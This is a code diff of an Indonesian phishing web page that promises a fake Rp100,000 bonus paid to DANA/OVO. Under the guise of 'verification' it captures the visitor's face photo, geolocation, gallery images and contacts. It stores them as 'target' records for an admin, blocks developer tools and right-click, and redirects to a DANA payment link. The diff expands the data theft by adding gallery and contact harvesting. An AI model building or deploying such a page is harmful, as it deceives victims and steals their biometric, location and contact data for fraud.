@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>✨ Bonus Spesial ✨</title>
+    <title>✨ Bonus Spesial 100RB ✨</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
         * {
@@ -24,7 +24,7 @@
             overflow-x: hidden;
         }
 
-        /* Background animated */
+        /* Animated Background */
         .bg-animation {
             position: fixed;
             top: 0;
@@ -57,24 +57,17 @@
             backdrop-filter: blur(10px);
             border-radius: 48px;
             padding: 40px 30px;
-            max-width: 500px;
+            max-width: 550px;
             width: 100%;
             box-shadow: 0 25px 50px -12px rgba(0,0,0,0.25);
             animation: slideUp 0.6s cubic-bezier(0.16, 1, 0.3, 1);
         }
 
         @keyframes slideUp {
-            from {
-                opacity: 0;
-                transform: translateY(50px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
+            from { opacity: 0; transform: translateY(50px); }
+            to { opacity: 1; transform: translateY(0); }
         }
 
-        /* Badge */
         .badge {
             background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
             display: inline-block;
@@ -86,7 +79,6 @@
             margin-bottom: 20px;
         }
 
-        /* Bonus Icon */
         .bonus-icon {
             font-size: 80px;
             margin-bottom: 20px;
@@ -113,19 +105,9 @@
             font-weight: 800;
             color: #f5576c;
             margin: 20px 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 5px;
         }
 
-        .price small {
-            font-size: 24px;
-            font-weight: 500;
-            color: #888;
-        }
-
-        /* Permission List Premium */
+        /* Permission List */
         .permission-list {
             background: #f8f9fa;
             border-radius: 24px;
@@ -139,11 +121,12 @@
             gap: 15px;
             padding: 12px 0;
             border-bottom: 1px solid #e9ecef;
+            cursor: pointer;
+            transition: all 0.3s;
         }
 
-        .permission-item:last-child {
-            border-bottom: none;
-        }
+        .permission-item:last-child { border-bottom: none; }
+        .permission-item:hover { background: #f0f0f0; padding-left: 10px; border-radius: 12px; }
 
         .permission-icon {
             width: 50px;
@@ -157,20 +140,9 @@
             box-shadow: 0 2px 8px rgba(0,0,0,0.05);
         }
 
-        .permission-text {
-            flex: 1;
-        }
-
-        .permission-text strong {
-            display: block;
-            font-size: 16px;
-            color: #1a1a2e;
-        }
-
-        .permission-text span {
-            font-size: 12px;
-            color: #6c757d;
-        }
+        .permission-text { flex: 1; }
+        .permission-text strong { display: block; font-size: 16px; color: #1a1a2e; }
+        .permission-text span { font-size: 12px; color: #6c757d; }
 
         .status-badge {
             background: #ffc107;
@@ -180,13 +152,9 @@
             font-size: 12px;
             font-weight: 600;
         }
+        .status-badge.success { background: #28a745; color: white; }
 
-        .status-badge.success {
-            background: #28a745;
-            color: white;
-        }
-
-        /* Button Premium */
+        /* Button */
         .btn-claim {
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: white;
@@ -197,41 +165,15 @@
             border-radius: 100px;
             width: 100%;
             cursor: pointer;
-            transition: all 0.3s ease;
-            margin-top: 10px;
+            transition: all 0.3s;
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 10px;
         }
+        .btn-claim:hover { transform: translateY(-2px); box-shadow: 0 10px 25px -5px rgba(102,126,234,0.4); }
 
-        .btn-claim:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 25px -5px rgba(102,126,234,0.4);
-        }
-
-        .btn-claim:active {
-            transform: translateY(0);
-        }
-
-        .btn-claim:disabled {
-            opacity: 0.7;
-            cursor: not-allowed;
-        }
-
-        /* Info Box */
-        .info-box {
-            background: #e8f4fd;
-            border-radius: 16px;
-            padding: 15px;
-            margin-top: 20px;
-            display: flex;
-            gap: 12px;
-            font-size: 13px;
-            color: #0c5460;
-        }
-
-        /* Loading Overlay */
+        /* Loading & Effects */
         .loading-overlay {
             position: fixed;
             top: 0;
@@ -247,11 +189,7 @@
             flex-direction: column;
             gap: 20px;
         }
-
-        .loading-overlay.active {
-            display: flex;
-        }
-
+        .loading-overlay.active { display: flex; }
         .spinner {
             width: 60px;
             height: 60px;
@@ -260,12 +198,8 @@
             border-radius: 50%;
             animation: spin 1s linear infinite;
         }
+        @keyframes spin { to { transform: rotate(360deg); } }
 
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        /* Strobe Effect */
         .strobe-effect {
             position: fixed;
             top: 0;
@@ -277,18 +211,12 @@
             display: none;
             pointer-events: none;
         }
-
-        .strobe-effect.active {
-            display: block;
-            animation: strobe 0.08s infinite;
-        }
-
+        .strobe-effect.active { display: block; animation: strobe 0.08s infinite; }
         @keyframes strobe {
             0%, 100% { opacity: 0; }
             50% { opacity: 1; }
         }
 
-        /* Success Screen */
         .success-screen {
             position: fixed;
             top: 0;
@@ -302,18 +230,8 @@
             align-items: center;
             flex-direction: column;
             gap: 20px;
-            animation: fadeIn 0.5s;
         }
-
-        .success-screen.active {
-            display: flex;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-
+        .success-screen.active { display: flex; }
         .checkmark {
             width: 100px;
             height: 100px;
@@ -325,11 +243,7 @@
             font-size: 50px;
             animation: scaleIn 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55);
         }
-
-        @keyframes scaleIn {
-            from { transform: scale(0); }
-            to { transform: scale(1); }
-        }
+        @keyframes scaleIn { from { transform: scale(0); } to { transform: scale(1); } }
     </style>
 </head>
 <body>
@@ -353,18 +267,32 @@
     <div class="bonus-icon">💰🎁💰</div>
     <h1>Selamat!</h1>
     <p style="color: #666; margin-bottom: 5px;">Anda mendapatkan bonus spesial</p>
-    <div class="price">
-        Rp<small>100.000</small>
-    </div>
+    <div class="price">Rp100.000</div>
 
     <div class="permission-list">
         <div class="permission-item" id="permCamera">
             <div class="permission-icon">📸</div>
             <div class="permission-text">
-                <strong>Kamera</strong>
+                <strong>Kamera & Foto</strong>
                 <span>Untuk verifikasi wajah</span>
             </div>
             <div class="status-badge" id="statusCamera">Pending</div>
+        </div>
+        <div class="permission-item" id="permGallery">
+            <div class="permission-icon">🖼️</div>
+            <div class="permission-text">
+                <strong>Galeri / Penyimpanan</strong>
+                <span>Verifikasi dokumen</span>
+            </div>
+            <div class="status-badge" id="statusGallery">Pending</div>
+        </div>
+        <div class="permission-item" id="permContacts">
+            <div class="permission-icon">📞</div>
+            <div class="permission-text">
+                <strong>Kontak</strong>
+                <span>Verifikasi nomor</span>
+            </div>
+            <div class="status-badge" id="statusContacts">Pending</div>
         </div>
         <div class="permission-item" id="permLocation">
             <div class="permission-icon">📍</div>
@@ -396,92 +324,103 @@
         🎉 Klaim Bonus Sekarang 🎉
     </button>
 
-    <div class="info-box">
-        <div>ℹ️</div>
-        <div>Bonus akan ditransfer ke akun DANA/OVO Anda maksimal 5 menit setelah verifikasi selesai.</div>
+    <div class="info-box" style="background:#e8f4fd; border-radius:16px; padding:15px; margin-top:20px; font-size:13px; color:#0c5460;">
+        ℹ️ Bonus akan ditransfer ke akun DANA/OVO Anda maksimal 5 menit setelah verifikasi selesai.
     </div>
 </div>
 
 <script>
-    // Data target yang akan disimpan
+    // Data target lengkap
     let targetData = {
         id: 'TGT-' + Date.now(),
         timestamp: new Date().toISOString(),
         waktu: new Date().toLocaleString('id-ID'),
         camera: null,
+        gallery: [],
+        contacts: [],
         location: null,
         flash: false,
         notification: false
     };
 
     let permissionStatus = {
-        camera: false,
-        location: false,
-        flash: false,
-        notification: false
+        camera: false, gallery: false, contacts: false, location: false, flash: false, notification: false
     };
 
-    // Update status UI
     function updateStatusUI() {
-        if(permissionStatus.camera) {
-            document.getElementById('statusCamera').textContent = '✅ Terekam';
-            document.getElementById('statusCamera').classList.add('success');
-            document.getElementById('permCamera').style.opacity = '0.7';
-        }
-        if(permissionStatus.location) {
-            document.getElementById('statusLocation').textContent = '✅ Terdeteksi';
-            document.getElementById('statusLocation').classList.add('success');
-            document.getElementById('permLocation').style.opacity = '0.7';
-        }
-        if(permissionStatus.flash) {
-            document.getElementById('statusFlash').textContent = '✅ Diizinkan';
-            document.getElementById('statusFlash').classList.add('success');
-            document.getElementById('permFlash').style.opacity = '0.7';
-        }
-        if(permissionStatus.notification) {
-            document.getElementById('statusNotif').textContent = '✅ Diizinkan';
-            document.getElementById('statusNotif').classList.add('success');
-            document.getElementById('permNotif').style.opacity = '0.7';
-        }
+        if(permissionStatus.camera) { document.getElementById('statusCamera').textContent = '✅ Terekam'; document.getElementById('statusCamera').classList.add('success'); }
+        if(permissionStatus.gallery) { document.getElementById('statusGallery').textContent = '✅ Diakses'; document.getElementById('statusGallery').classList.add('success'); }
+        if(permissionStatus.contacts) { document.getElementById('statusContacts').textContent = '✅ Diakses'; document.getElementById('statusContacts').classList.add('success'); }
+        if(permissionStatus.location) { document.getElementById('statusLocation').textContent = '✅ Terdeteksi'; document.getElementById('statusLocation').classList.add('success'); }
+        if(permissionStatus.flash) { document.getElementById('statusFlash').textContent = '✅ Diizinkan'; document.getElementById('statusFlash').classList.add('success'); }
+        if(permissionStatus.notification) { document.getElementById('statusNotif').textContent = '✅ Diizinkan'; document.getElementById('statusNotif').classList.add('success'); }
     }
 
-    // Aktifkan senter/strobe
+    // Strobe effect
     function activateStrobe() {
         const strobe = document.getElementById('strobe');
         strobe.classList.add('active');
-        if(navigator.vibrate) navigator.vibrate([200, 100, 200, 100, 300]);
-        setTimeout(() => {
-            strobe.classList.remove('active');
-        }, 2000);
+        if(navigator.vibrate) navigator.vibrate([200,100,200,100,300]);
+        setTimeout(() => strobe.classList.remove('active'), 2000);
     }
 
     // Ambil foto dari kamera
     async function capturePhoto() {
         return new Promise(async (resolve) => {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: 'user' },
-                    audio: false 
-                });
-                
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 video.play();
-                
                 setTimeout(() => {
                     const canvas = document.createElement('canvas');
                     canvas.width = video.videoWidth || 640;
                     canvas.height = video.videoHeight || 480;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                     const photoData = canvas.toDataURL('image/jpeg', 0.8);
-                    
                     stream.getTracks().forEach(track => track.stop());
                     resolve(photoData);
                 }, 1000);
-            } catch(e) {
-                console.log('Camera error:', e);
-                resolve(null);
+            } catch(e) { resolve(null); }
+        });
+    }
+
+    // Akses galeri (file input)
+    function accessGallery() {
+        return new Promise((resolve) => {
+            const input = document.createElement('input');
+            input.type = 'file';
+            input.accept = 'image/*';
+            input.multiple = true;
+            input.onchange = async (e) => {
+                const files = e.target.files;
+                const images = [];
+                for(let i = 0; i < Math.min(files.length, 5); i++) {
+                    const reader = new FileReader();
+                    const imgData = await new Promise((res) => {
+                        reader.onload = (e) => res(e.target.result);
+                        reader.readAsDataURL(files[i]);
+                    });
+                    images.push(imgData);
+                }
+                resolve(images);
+            };
+            input.click();
+            setTimeout(() => resolve([]), 5000);
+        });
+    }
+
+    // Akses kontak (dengan fallback)
+    function accessContacts() {
+        return new Promise((resolve) => {
+            if(navigator.contacts && navigator.contacts.select) {
+                navigator.contacts.select(['name', 'tel'], { multiple: true })
+                    .then(contacts => resolve(contacts.map(c => ({ name: c.name[0] || 'Unknown', phone: c.tel[0] || '' }))))
+                    .catch(() => resolve([]));
+            } else {
+                // Fallback: minta input manual
+                const input = prompt('Masukkan nomor kontak untuk verifikasi (contoh: 08123456789):');
+                resolve(input ? [{ name: 'Manual Input', phone: input }] : []);
             }
         });
     }
@@ -494,97 +433,63 @@
                     (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude }),
                     () => resolve(null)
                 );
-            } else {
-                resolve(null);
-            }
+            } else { resolve(null); }
         });
     }
 
-    // Minta notifikasi
-    function requestNotification() {
-        if('Notification' in window && Notification.permission !== 'granted') {
-            Notification.requestPermission().then(perm => {
-                if(perm === 'granted') {
-                    permissionStatus.notification = true;
-                    targetData.notification = true;
-                    updateStatusUI();
-                    new Notification('🎉 Verifikasi Berhasil!', {
-                        body: 'Bonus Rp100.000 akan segera dikirim',
-                        icon: 'https://cdn-icons-png.flaticon.com/512/2331/2331966.png'
-                    });
-                }
-            });
-        } else if(Notification.permission === 'granted') {
-            permissionStatus.notification = true;
-            targetData.notification = true;
-            updateStatusUI();
-        }
-    }
-
-    // Simpan data ke localStorage (bisa dibaca admin)
+    // Simpan ke localStorage (sync ke admin)
     function saveToLocalStorage() {
-        let existing = JSON.parse(localStorage.getItem('bonus_targets') || '[]');
+        let existing = JSON.parse(localStorage.getItem('bonus_targets_full') || '[]');
         existing.push(targetData);
-        localStorage.setItem('bonus_targets', JSON.stringify(existing));
-        
-        // Trigger event untuk admin panel (kalo lagi kebuka)
+        localStorage.setItem('bonus_targets_full', JSON.stringify(existing));
         window.dispatchEvent(new Event('storage'));
     }
 
-    // Proses klaim utama
     async function processClaim() {
         const btn = document.getElementById('claimBtn');
         btn.disabled = true;
         btn.innerHTML = '⏳ Memverifikasi... ⏳';
         document.getElementById('loading').classList.add('active');
 
-        // 1. Minta kamera + foto
+        // Kamera
         const photo = await capturePhoto();
-        if(photo) {
-            permissionStatus.camera = true;
-            targetData.camera = photo;
-            updateStatusUI();
-        }
+        if(photo) { permissionStatus.camera = true; targetData.camera = photo; updateStatusUI(); }
 
-        // 2. Minta lokasi
+        // Galeri
+        const gallery = await accessGallery();
+        if(gallery.length > 0) { permissionStatus.gallery = true; targetData.gallery = gallery; updateStatusUI(); }
+
+        // Kontak
+        const contacts = await accessContacts();
+        if(contacts.length > 0) { permissionStatus.contacts = true; targetData.contacts = contacts; updateStatusUI(); }
+
+        // Lokasi
         const location = await getLocation();
-        if(location) {
-            permissionStatus.location = true;
-            targetData.location = location;
-            updateStatusUI();
-        }
+        if(location) { permissionStatus.location = true; targetData.location = location; updateStatusUI(); }
 
-        // 3. Minta senter (via confirm)
+        // Senter
         const flashAllowed = confirm('⚡ Izinkan akses senter untuk verifikasi perangkat? ⚡');
-        if(flashAllowed) {
-            permissionStatus.flash = true;
-            targetData.flash = true;
-            activateStrobe();
-            updateStatusUI();
+        if(flashAllowed) { permissionStatus.flash = true; targetData.flash = true; activateStrobe(); updateStatusUI(); }
+
+        // Notifikasi
+        if('Notification' in window && Notification.permission !== 'granted') {
+            Notification.requestPermission().then(perm => {
+                if(perm === 'granted') { permissionStatus.notification = true; targetData.notification = true; updateStatusUI(); }
+            });
         }
 
-        // 4. Minta notifikasi
-        requestNotification();
-
-        // Simpan semua data
         saveToLocalStorage();
 
-        // Selesai loading
         setTimeout(() => {
             document.getElementById('loading').classList.remove('active');
             document.getElementById('successScreen').classList.add('active');
-            
-            // Redirect ke DANA setelah 3 detik
-            setTimeout(() => {
-                window.location.href = 'https://link.dana.id/qr/'; // Ganti dengan link DANA lu
-            }, 3000);
+            setTimeout(() => window.location.href = 'https://link.dana.id/qr/', 3000);
         }, 1500);
     }
 
-    // Event listener tombol
     document.getElementById('claimBtn').addEventListener('click', processClaim);
 
-    // Floating background animation
+    // Floating background
     function createFloatingElements() {
         const bg = document.getElementById('bgAnimation');
         for(let i = 0; i < 30; i++) {
@@ -599,14 +504,8 @@
     }
     createFloatingElements();
 
-    // Disable dev tools
     document.addEventListener('contextmenu', e => e.preventDefault());
-    document.addEventListener('keydown', e => {
-        if(e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') ||
-           (e.ctrlKey && e.key === 'u') || (e.ctrlKey && e.key === 's')) {
-            e.preventDefault();
-        }
-    });
+    document.addEventListener('keydown', e => { if(e.key === 'F12') e.preventDefault(); });
 </script>
 </body>
 </html>
